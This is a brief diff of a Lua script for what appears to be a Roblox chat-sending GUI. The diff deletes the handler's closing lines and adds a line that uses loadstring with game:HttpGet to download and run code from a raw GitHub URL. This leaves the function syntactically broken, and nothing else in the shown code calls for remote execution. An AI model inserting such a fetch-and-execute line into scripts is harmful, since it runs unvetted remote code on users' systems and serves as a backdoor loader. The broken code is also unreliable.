@@ -77,5 +77,5 @@ end
 sendButton.MouseButton1Click:Connect(function()
     if textBox.Text ~= "" then
         sendToChat(textBox.Text)
-    end
-end)
+    
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ladomirkout-wq/script.lua/refs/heads/main/Must've%20been%20the%20wind"))()
